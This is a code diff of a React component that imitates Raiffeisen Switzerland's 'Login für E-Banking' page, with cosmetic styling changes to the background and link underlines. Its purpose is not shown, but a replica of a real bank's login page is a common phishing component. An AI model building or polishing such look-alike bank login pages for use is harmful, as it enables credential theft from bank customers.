@@ -62,7 +62,7 @@ const ChRaiffeisen = () => {
         </header>
 
         {/* Full-screen main area */}
-        <main className="flex-1 flex flex-col px-6 md:px-12 min-h-[calc(100vh-80px)] bg-[#f5f5f5]">
+        <main className="flex-1 flex flex-col px-6 md:px-12 min-h-[calc(100vh-80px)]">
 
           <div className="w-full max-w-[530px] md:ml-[22%] pt-12 md:pt-16">
             <h1 className="text-3xl md:text-4xl font-bold mb-10">Login für E-Banking</h1>
@@ -119,7 +119,7 @@ const ChRaiffeisen = () => {
 
             {/* Passwort vergessen */}
             <div>
-              <a href="https://login.raiffeisen.ch/de/first-factor" className="text-base underline underline-offset-[6px] hover:no-underline" style={{ color: BRONZE }}>
+              <a href="https://login.raiffeisen.ch/de/first-factor" className="text-base underline underline-offset-[6px] decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
                 Passwort vergessen?
               </a>
             </div>
@@ -127,13 +127,14 @@ const ChRaiffeisen = () => {
 
           {/* Bottom service links - links unter Passwort vergessen ausgerichtet */}
           <div className="mt-auto pt-10 pb-8 w-full flex items-center justify-between md:pl-[22%] pr-12 text-base">
-            <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 hover:no-underline" style={{ color: BRONZE }}>
+            <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
               Neues Gerät für PhotoTAN aktivieren
             </a>
-            <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 hover:no-underline" style={{ color: BRONZE }}>
+            <a href="https://login.raiffeisen.ch/de/first-factor" className="underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
               Hilfe und Kontakt
             </a>
           </div>
+
 
 
         </main>
